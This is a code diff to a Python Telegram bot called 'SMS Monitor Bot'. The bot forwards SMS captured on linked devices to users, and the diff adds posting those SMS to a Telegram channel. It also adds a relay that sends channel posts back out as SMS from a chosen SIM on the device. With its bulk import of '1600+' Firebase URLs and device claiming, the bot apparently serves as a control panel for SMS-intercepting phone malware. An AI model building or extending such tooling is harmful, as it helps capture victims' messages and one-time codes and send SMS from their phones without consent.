@@ -6,13 +6,16 @@ from telegram import Update
 from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters
 
 from app.config import get_settings
-from app.database import Device, SMSMessage, SessionLocal
+from app.database import Device, MonitorProfile, SMSMessage, SessionLocal
 from app.bulk_firebase import bulk_import_from_txt
+from app.channel_relay import get_profile_by_channel, queue_channel_sms
 from app.device_ui import (
     device_set_keyboard,
+    format_addchannel_card,
     format_device_set_card,
     format_firebase_connected_card,
     format_monitoring_card,
+    get_sim_list,
     monitoring_keyboard,
 )
 from app.services import (
@@ -24,6 +27,7 @@ from app.services import (
     get_monitor_profile,
     select_sim_slot,
     connect_firebase_url,
+    set_channel_id,
     show_device_by_id,
     set_user_phone,
     start_monitoring,
@@ -87,11 +91,22 @@ async def notify_new_sms(sms: SMSMessage) -> None:
     bot = Bot(token=settings.telegram_bot_token)
     text = "🆕 *New SMS Received*\n\n" + format_sms(sms)
 
-    for user_id in monitoring_users:
-        try:
-            await bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown")
-        except Exception as exc:
-            logger.error("Failed to notify user %s: %s", user_id, exc)
+    db: Session = SessionLocal()
+    try:
+        for user_id in monitoring_users:
+            try:
+                await bot.send_message(chat_id=user_id, text=text, parse_mode="Markdown")
+            except Exception as exc:
+                logger.error("Failed to notify user %s: %s", user_id, exc)
+
+            profile = get_monitor_profile(db, user_id)
+            if profile and profile.channel_id and profile.is_monitoring:
+                try:
+                    await bot.send_message(chat_id=profile.channel_id, text=text, parse_mode="Markdown")
+                except Exception as exc:
+                    logger.error("Failed to post SMS to channel %s: %s", profile.channel_id, exc)
+    finally:
+        db.close()
 
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -103,9 +118,11 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         "👋 *SMS Monitor Bot*\n\n"
         "Commands:\n"
         "/mynum <number> - Apna number set karo\n"
+        "/addchannel <id> - Channel connect + auto SMS send\n"
         "/startmonitar - SMS forwarding start\n"
         "/stopmonitar - SMS forwarding stop\n"
-        "/setfirebase <url> - Firebase attach karo\n"
+        "/setfirebase <url> - Firebase connect karo\n"
+        "/setdevice <id> - Device select karo\n"
         "/allfirebase - Txt file se 1600+ Firebase import\n"
         "/a <deviceid> - Apni device add/claim karo\n"
         "/devices - Apni saari devices dekho\n"
@@ -212,6 +229,82 @@ async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYP
         parse_mode="HTML",
         reply_markup=monitoring_keyboard(),
     )
+
+
+async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user = update.effective_user
+    if not is_authorized(user.id if user else None):
+        return
+
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: `/addchannel <channel-id>`\n\n"
+            "Example:\n"
+            "`/addchannel -1003553669855`\n\n"
+            "Bot ko channel mein admin banao!",
+            parse_mode="Markdown",
+        )
+        return
+
+    channel_id = context.args[0]
+    db: Session = SessionLocal()
+    try:
+        profile = set_channel_id(db, user.id, channel_id)
+        device = get_active_device(db, user.id)
+        sim_slot = 1
+        if device:
+            sims = get_sim_list(device)
+            sim_index = profile.selected_sim_index or 0
+            sim_slot = sims[sim_index]["slot"] if sims else 1
+    except ValueError as exc:
+        await update.message.reply_text(f"❌ {exc}")
+        return
+    finally:
+        db.close()
+
+    await update.message.reply_text(
+        format_addchannel_card(channel_id, sim_slot=sim_slot),
+        parse_mode="HTML",
+    )
+
+
+async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    message = update.channel_post
+    if not message or not message.text:
+        return
+
+    channel_id = str(message.chat_id)
+    db: Session = SessionLocal()
+    try:
+        linked = get_profile_by_channel(db, channel_id)
+        if not linked:
+            return
+
+        for profile, device in linked:
+            try:
+                outbound = queue_channel_sms(
+                    db,
+                    profile,
+                    device,
+                    message.text,
+                    channel_message_id=message.message_id,
+                )
+                sims = get_sim_list(device)
+                sim_index = profile.selected_sim_index or 0
+                sim_label = sims[sim_index]["carrier"] if sims else f"SIM {outbound.sim_slot}"
+
+                await message.reply_text(
+                    f"✅ <b>Auto Send Queued</b>\n\n"
+                    f"📶 SIM: {sim_label}\n"
+                    f"📞 To: {outbound.to_number}\n"
+                    f"💬 {outbound.message[:100]}",
+                    parse_mode="HTML",
+                )
+            except Exception as exc:
+                logger.error("Channel relay failed: %s", exc)
+                await message.reply_text(f"❌ Send failed: {exc}")
+    finally:
+        db.close()
 
 
 async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -633,6 +726,8 @@ def build_telegram_app() -> Application | None:
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("mynum", mynum_command))
+    app.add_handler(CommandHandler("addchannel", addchannel_command))
+    app.add_handler(MessageHandler(filters.ChatType.CHANNEL & filters.TEXT, channel_sms_handler))
     app.add_handler(CommandHandler("startmonitar", startmonitar_command))
     app.add_handler(CommandHandler("startmonitor", startmonitar_command))
     app.add_handler(CommandHandler("stopmonitar", stopmonitar_command))
